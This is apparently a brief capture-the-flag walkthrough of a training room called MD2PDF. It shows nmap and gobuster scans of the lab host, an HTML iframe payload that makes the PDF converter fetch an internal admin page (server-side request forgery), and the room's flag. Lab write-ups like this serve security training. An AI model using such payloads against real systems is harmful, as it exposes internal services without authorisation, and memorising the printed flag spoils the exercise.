## **Room:** [MD2PDF](https://tryhackme.com/room/md2pdf)
---
For today's room I decided to do a simple 5-minute room and focus more on learning by watching the lectures from TryHackMe.
> **Prompt**
>
> > Hello Hacker!
> > TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.
> > This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

Host: 10.201.79.96

## Walkthrough
First, I checked the open ports:
```bash
nmap -sS -sV 10.201.79.96
```
Result: 
```text
22
80
5000
```
Then I have looked up its directory:
```bash
gobuster dir -u 10.201.79.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Result: /admin, /convert
Both required permissions I didn't have.
Then I investigated the converter further and discovered that it executes HTML input. So I submitted the following to the admin page:
```nginx
<iframe src="http://localhost:5000/admin><iframe>
```
Eventually, I have found the flag of the day: flag{1f4a2b6ffeaf4707c43885d704eaee4b}